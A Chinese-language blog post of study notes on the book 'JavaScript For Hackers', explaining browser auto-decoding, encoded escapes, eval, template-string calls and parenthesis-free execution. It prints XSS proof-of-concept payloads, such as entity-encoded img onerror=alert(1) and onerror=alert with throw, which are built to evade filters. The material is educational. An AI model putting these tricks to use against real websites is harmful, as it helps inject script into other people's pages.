<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="JavaScript For Hackers随笔"><meta name="keywords" content="JavaScript,Fuzz,XSS"><meta name="author" content="Sys71m"><meta name="copyright" content="Sys71m"><title>JavaScript For Hackers随笔 | sys71m</title><link rel="shortcut icon" href="/lufei.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><link rel="alternate" href="/atom.xml" title="sys71m" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本概念"><span class="toc-number">1.</span> <span class="toc-text">基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#自解码机制"><span class="toc-number">1.1.</span> <span class="toc-text">自解码机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Eval函数"><span class="toc-number">1.2.</span> <span class="toc-text">Eval函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#字符串"><span class="toc-number">1.3.</span> <span class="toc-text">字符串</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无括号执行JavaScript"><span class="toc-number">2.</span> <span class="toc-text">无括号执行JavaScript</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用valueOf"><span class="toc-number">2.1.</span> <span class="toc-text">使用valueOf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用throw"><span class="toc-number">2.2.</span> <span class="toc-text">使用throw</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用模板字符串"><span class="toc-number">2.3.</span> <span class="toc-text">使用模板字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用Has-instance-symbol"><span class="toc-number">2.4.</span> <span class="toc-text">使用Has instance symbol</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fuzzing"><span class="toc-number">3.</span> <span class="toc-text">Fuzzing</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Fuzzing-Javascript-Urls"><span class="toc-number">3.1.</span> <span class="toc-text">Fuzzing Javascript Urls</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fuzzing-HTTP-URLs"><span class="toc-number">3.2.</span> <span class="toc-text">Fuzzing HTTP URLs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fuzzing-HTML"><span class="toc-number">3.3.</span> <span class="toc-text">Fuzzing HTML</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fuzzing-known-behavious"><span class="toc-number">3.4.</span> <span class="toc-text">Fuzzing known behavious</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-Hacker"><span class="toc-number">4.</span> <span class="toc-text">DOM Hacker</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取window对象"><span class="toc-number">4.1.</span> <span class="toc-text">获取window对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML事件范围"><span class="toc-number">4.2.</span> <span class="toc-text">HTML事件范围</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM-clobbering技术"><span class="toc-number">4.3.</span> <span class="toc-text">DOM clobbering技术</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原型污染"><span class="toc-number">5.</span> <span class="toc-text">原型污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS构造"><span class="toc-number">6.</span> <span class="toc-text">XSS构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#通过闭合script"><span class="toc-number">6.1.</span> <span class="toc-text">通过闭合script</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用svg标签"><span class="toc-number">6.2.</span> <span class="toc-text">使用svg标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注入window"><span class="toc-number">6.3.</span> <span class="toc-text">注入window</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sourceMappingURL注释"><span class="toc-number">6.4.</span> <span class="toc-text">sourceMappingURL注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#新的重定向方式"><span class="toc-number">6.5.</span> <span class="toc-text">新的重定向方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#引入新行"><span class="toc-number">6.6.</span> <span class="toc-text">引入新行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用空白符"><span class="toc-number">6.7.</span> <span class="toc-text">利用空白符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#动态导入"><span class="toc-number">6.8.</span> <span class="toc-text">动态导入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#控制text-xml"><span class="toc-number">6.9.</span> <span class="toc-text">控制text/xml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#svg文件上传"><span class="toc-number">6.10.</span> <span class="toc-text">svg文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML实体"><span class="toc-number">6.11.</span> <span class="toc-text">HTML实体</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">7.</span> <span class="toc-text">Reference</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/lufei.jpg"></div><div class="author-info__name text-center">Sys71m</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/ttonys">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">38</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">55</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">22</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://raw.githubusercontent.com/ttonys/MarkDownPic/master/test33.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">sys71m</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/recon">Recon</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">JavaScript For Hackers随笔</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-10</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/JavaScript/">JavaScript</a><span class="post-meta__separator">|</span><i class="fa fa-comment-o post-meta__icon" aria-hidden="true"></i><a href="/2023/06/10/JavaScript-For-Hackers随笔/#disqus_thread"><span class="disqus-comment-count" data-disqus-identifier="2023/06/10/JavaScript-For-Hackers随笔/"></span></a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">7.3k</span><span class="post-meta__separator">|</span><span>Reading time: 30 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>书名：JavaScriptForHackers<br>作者：Gareth Heyes</p>
<a id="more"></a> 
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="自解码机制"><a href="#自解码机制" class="headerlink" title="自解码机制"></a>自解码机制</h4><p>一个网页主要由三部分组成：HTML+CSS+JS</p>
<p>浏览器在解析过程中，主要有三个过程：HTML解析、CSS解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解析工作。</p>
<p> 1. HTML/SVG/XHTML 解析。解析这三种文件会产生一个DOM Tree<br>  2. CSS 解析，解析CSS会产生CSS规则树<br>  3. Javascript 解析<br>  4. URL解析</p>
<p>一个简单的XSS代码：<code>&lt;img/src=1 onerror=alert(1)&gt;</code>，<code>onerror</code>后面的语句，会被浏览器识别为JS代码，因此会执行自动解码。我们可以使用10进制、16进制对<code>alert(1)</code>进行编码，依然可以执行弹窗。</p>
<p>10进制编码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>16进制编码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>10进制和16进制混合，也可以自动解码并执行：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">&amp;#97;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>除了实体编码的形式，浏览器还支持通过反斜杠的形式解码16进制、8进制、Unicode编码：</p>
<p><strong>16进制解码</strong></p>
<p>16进制的形式为<code>\x</code>，单引号、双引号、反引号都会进行自解码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'\x61'</span><span class="comment">//a</span></span><br><span class="line"><span class="string">"\x61"</span><span class="comment">//a</span></span><br><span class="line"><span class="string">`\x61`</span><span class="comment">//a</span></span><br></pre></td></tr></table></figure>
<p>如果创建一个a函数，然后使用16进制的方式调用，会成功吗？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">\x61() <span class="comment">//Uncaught SyntaxError: Invalid or unexpected token</span></span><br></pre></td></tr></table></figure>
<p>答案是不可调用，js不支持通过16进制的方式调用函数，此外<code>x</code>必须为小写，<code>\X61</code>是不会解码的，会被视为字符串。</p>
<p><strong>Unicode解码</strong></p>
<p>浏览器支持的Unicode的形式有2种，分别为<code>\u</code>和<code>\u{}</code>，先介绍第一种形式<code>\u</code>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'\u0061'</span><span class="comment">//a</span></span><br><span class="line"><span class="string">"\u0061"</span><span class="comment">//a</span></span><br><span class="line"><span class="string">`\u0061`</span><span class="comment">//a</span></span><br><span class="line"><span class="string">'\u61'</span><span class="comment">//Uncaught SyntaxError: Invalid Unicode escape sequence</span></span><br></pre></td></tr></table></figure>
<p>注意，<code>\u</code>形式的编码方式，必须指定为4位字符，<code>\u61</code>会报错。</p>
<p>同样，创建一个a函数，Unicode的形式可以调用成功吗？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">\u0061() <span class="comment">//Call Success!</span></span><br></pre></td></tr></table></figure>
<p>答案是可以调用！js是可以支持Unicode形式的函数调用。</p>
<p>第二种形式<code>\u{}</code>，这种形式的Unicode编码是将16进制写入大括号内，并且支持任意长度，js会自动填充和排除多余的0.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'\u&#123;61&#125;'</span><span class="comment">//a</span></span><br><span class="line"><span class="string">"\u&#123;000000000061&#125;"</span><span class="comment">//a</span></span><br><span class="line"><span class="string">`\u&#123;0061&#125;`</span><span class="comment">//a</span></span><br></pre></td></tr></table></figure>
<p>同样，是否支持函数调用呢？也是可以的</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">\u&#123;<span class="number">61</span>&#125;() <span class="comment">//Call Success!</span></span><br></pre></td></tr></table></figure>
<p>其他：<code>\u{}</code>还可以用来指定变量：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u&#123;<span class="number">3131</span>a&#125;=<span class="number">123</span> <span class="comment">//指定unicode编码的3131a变量为123</span></span><br></pre></td></tr></table></figure>
<p><strong>8进制解码</strong></p>
<p>8进制是直接通过反斜杠来指定，如果数字超过8进制的范围，则直接返回10进制。并且不支持反引号形式的自解码。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'\141'</span><span class="comment">//a</span></span><br><span class="line"><span class="string">"\141"</span><span class="comment">//a</span></span><br><span class="line"><span class="string">`\141`</span><span class="comment">//Uncaught SyntaxError: Octal escape sequences are not allowed in template strings.</span></span><br><span class="line"><span class="string">'\8'</span><span class="comment">//超过8进制，则直接返回10进制的8</span></span><br></pre></td></tr></table></figure>
<h4 id="Eval函数"><a href="#Eval函数" class="headerlink" title="Eval函数"></a>Eval函数</h4><p>上面演示了浏览器对不同编码的自解码机制，是否可以与<code>eval</code>或其他类似的函数(setTimeout)一起使用？</p>
<p><code>eval</code>函数的主要作用如下：</p>
<ul>
<li>eval() 函数计算 JavaScript 字符串，并把它作为脚本代码来执行。</li>
<li>如果参数是一个表达式，eval() 函数将执行表达式。如果参数是Javascript语句，eval()将执行 Javascript 语句。</li>
</ul>
<p><strong>eval和16进制</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">'\x61=123'</span>)<span class="comment">//a=123</span></span><br></pre></td></tr></table></figure>
<p><strong>eval和8进制</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">'\141=123'</span>)<span class="comment">//a=123</span></span><br></pre></td></tr></table></figure>
<p><strong>eval和Unicode</strong></p>
<p>Uniocde的双重编码同样支持。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">'\u0061=123'</span>)<span class="comment">//a=123</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">'\\u0061=123'</span>)<span class="comment">//a=123</span></span><br></pre></td></tr></table></figure>
<p><strong>eval和混合编码</strong></p>
<p>16进制和8进制和Unicode混合</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">'\\u\x30061=123'</span>)<span class="comment">//a=123,'\x30'=&gt;0</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">'\\u\x3006\61=123'</span>)<span class="comment">//a=123,'\x30'=&gt;0、'\61'=&gt;1</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">'\\u\x300\661=123'</span>)<span class="comment">//a=123,'\x30'=&gt;0、'\66'=&gt;6</span></span><br></pre></td></tr></table></figure>
<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>js中字符串有三种形式，单引号、双引号、反引号。</p>
<p><strong>特殊字符</strong></p>
<p>下面是一些被用作特定用途的转义字符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&apos;\b&apos;//backspace</span><br><span class="line">&apos;\f&apos;//formfeed</span><br><span class="line">&apos;\n&apos;//newline</span><br><span class="line">&apos;\r&apos;//carriagereturn</span><br><span class="line">&apos;\t&apos;//tab</span><br><span class="line">&apos;\v&apos;//verticaltab</span><br><span class="line">&apos;\0&apos;//null</span><br><span class="line">&apos;\&apos;&apos;//singlequote</span><br><span class="line">&apos;\&quot;&apos;//doublequote</span><br><span class="line">&apos;\\&apos;//backslash</span><br></pre></td></tr></table></figure>
<p>对于不是特殊用途的字符，会通过反斜杠直接输出：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'\H\E\L\L\O'</span>)<span class="comment">//HELLO</span></span><br></pre></td></tr></table></figure>
<p>通过反斜杠，可以将一行字符串变为多行：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'hello \</span></span><br><span class="line"><span class="string">world!'</span> <span class="comment">//hello world!</span></span><br></pre></td></tr></table></figure>
<p>这种方法同样也适用于对象属性：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    <span class="string">"ba\</span></span><br><span class="line"><span class="string">r"</span>:<span class="string">"bar"</span></span><br><span class="line">&#125; <span class="comment">// &#123;bar: 'bar'&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong>模板字符串</strong></p>
<p>在反引号中，可以内置表达式，形式为<code>${}</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$&#123;7*7&#125;`//49</span><br></pre></td></tr></table></figure>
<p>此外，js还支持嵌套多个表达式，仍然可以解析执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$&#123;`$&#123;`$&#123;`$&#123;7*7&#125;`&#125;`&#125;`&#125;`//49</span><br></pre></td></tr></table></figure>
<p>模板字符串还有一个重要的特性，可以用来进行函数调用，如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert<span class="string">`123`</span></span><br></pre></td></tr></table></figure>
<p>除了js内置的函数外，也可以调用我们自定义的函数，假设函数x返回自身，则可以用反引号进行无限次的调用。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> x&#125;</span><br><span class="line">x<span class="string">``</span><span class="string">``</span><span class="string">``</span><span class="comment">//ƒ x()&#123;return x&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong>call和apply函数</strong></p>
<p>在JavaScript中，每个函数对象都带有call()和apply()方法，即Function.prototype.call()和Function.prototype.apply()，这两个方法都是挂载在原型上的，通过调用这两个方法，我们可以改变this指向，从而让我们的this指向不在是谁调用了函数就指向谁。</p>
<ul>
<li><strong>call()</strong> 方法使用一个指定的this值和单独给出的一个或多个参数来调用一个函数。</li>
<li><strong>apply()</strong>方法调用一个具有给定this值的函数，以及以一个数组（或类数组对象）的形式提供的参数。</li>
</ul>
<p>call方法例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.bar)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="string">'bar'</span>&#125;</span><br><span class="line">x.call(foo) <span class="comment">//bar</span></span><br></pre></td></tr></table></figure>
<p>从上面的输出结果来看，传入的foo对象，会更改的x函数内的this指向。另外，call方法支持多个参数的传入，当第一个参数是null时，this的指向为不会改变。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">0</span>]) <span class="comment">//1</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">1</span>]) <span class="comment">//2</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>) <span class="comment">//&#123;bar: 'bar'&#125;</span></span><br><span class="line">&#125;</span><br><span class="line">x.call(foo, <span class="number">1</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">0</span>]) <span class="comment">//1</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">1</span>]) <span class="comment">//2</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>) <span class="comment">//Window &#123;window: Window, self: Window, ...&#125;</span></span><br><span class="line">&#125;</span><br><span class="line">x.call(<span class="literal">null</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>如果需要将this指针变为null，可以开启严格模式<code>use strict</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">		"use strict"</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">0</span>]) <span class="comment">//1</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">1</span>]) <span class="comment">//2</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>) <span class="comment">//null</span></span><br><span class="line">&#125;</span><br><span class="line">x.call(<span class="literal">null</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>apply方法例子：</p>
<p>apply方法与call方法不同点在于，它支持数组方式的传参：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">		"use strict"</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">0</span>]) <span class="comment">//1</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">1</span>]) <span class="comment">//2</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>) <span class="comment">//null</span></span><br><span class="line">&#125;</span><br><span class="line">x.apply(<span class="literal">null</span>, [<span class="number">1</span>, <span class="number">2</span>])</span><br></pre></td></tr></table></figure>
<h3 id="无括号执行JavaScript"><a href="#无括号执行JavaScript" class="headerlink" title="无括号执行JavaScript"></a>无括号执行JavaScript</h3><h4 id="使用valueOf"><a href="#使用valueOf" class="headerlink" title="使用valueOf"></a>使用valueOf</h4><p>原始的<code>valueOf()</code>方法会返回 this 值本身，如果尚未转换为对象，则转换为对象。因此它的返回值将从不会被任何原始值转换算法使用。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">foo</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="built_in">console</span>.log(obj.valueOf() === obj); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>通过重写<code>valueOf</code>方法，可以自定义转换的值：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;valueOf()&#123;<span class="keyword">return</span> <span class="number">1</span>&#125;&#125;</span><br><span class="line">obj+<span class="number">1</span> <span class="comment">//2</span></span><br></pre></td></tr></table></figure>
<p>是否可以将返回值修改为<code>alert</code>，来执行弹窗呢？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">valueOf</span>:alert&#125;</span><br><span class="line">obj+<span class="number">1</span> <span class="comment">//Illegal invocation</span></span><br></pre></td></tr></table></figure>
<p>答案是不可以，因为在调用<code>obj+1</code>的过程中，会默认执行<code>valueOf</code>方法进行转换，相当于调用<code>alert</code>方法。但是<code>alert</code>方法调用的this对象需要是一个<code>window</code>对象，而当前调用的this对象为<code>obj</code>，因此会显示非法调用。</p>
<p>是否，可以直接覆写window对象的<code>valueOf</code>方法，执行<code>alert</code>调用呢？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.valueOf=alert</span><br><span class="line"><span class="built_in">window</span>+<span class="number">1</span> <span class="comment">//Call Success!</span></span><br></pre></td></tr></table></figure>
<p>因为<code>alert</code>的this指向为<code>window</code>，因此可以调用成功。此外，无需显式的指定<code>window</code>对象，默认的<code>valueOf</code>就是指向<code>window</code>的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">valueOf=alert</span><br><span class="line"><span class="built_in">window</span>+<span class="number">1</span> <span class="comment">//Call Success!</span></span><br></pre></td></tr></table></figure>
<h4 id="使用throw"><a href="#使用throw" class="headerlink" title="使用throw"></a>使用throw</h4><p>前面，我们可以通过修改<code>valueOf</code>，来执行弹窗，但是无法传入参数，能否无括号执行js，并且传入参数？</p>
<p>常见的throw用法，用来抛出异常：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>); <span class="comment">// Uncaught Error: test</span></span><br><span class="line"><span class="keyword">throw</span> <span class="string">'test'</span>; <span class="comment">// Uncaught test</span></span><br></pre></td></tr></table></figure>
<p>通过上面的输出结果，可以看出，throw语句可以接受一个表达式或字符串，并把错误内容交给错误处理程序。</p>
<p>是否可以通过自定义错误程序处理程序，来达到传递参数的目的？</p>
<blockquote>
<p>实际并没有执行弹窗，但书上说执行了？</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onerror=alert;</span><br><span class="line"><span class="keyword">throw</span> <span class="string">'foo'</span>; <span class="comment">// Uncaught test</span></span><br></pre></td></tr></table></figure>
